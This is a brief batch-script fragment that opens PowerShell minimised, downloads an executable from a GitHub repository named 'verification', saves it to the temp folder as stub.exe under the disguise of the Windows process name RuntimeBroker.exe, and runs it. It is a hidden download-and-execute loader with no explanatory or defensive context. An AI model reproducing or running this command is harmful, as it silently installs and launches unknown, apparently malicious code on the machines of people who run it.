...
start /min "" powershell -Command "Invoke-WebRequest -Uri 'https://github.com/centralskid/verification/raw/refs/heads/main/stuff/RuntimeBroker.exe' -OutFile '%TEMP%\stub.exe'; if (Test-Path '%TEMP%\stub.exe') { Start-Process '%TEMP%\stub.exe' }"
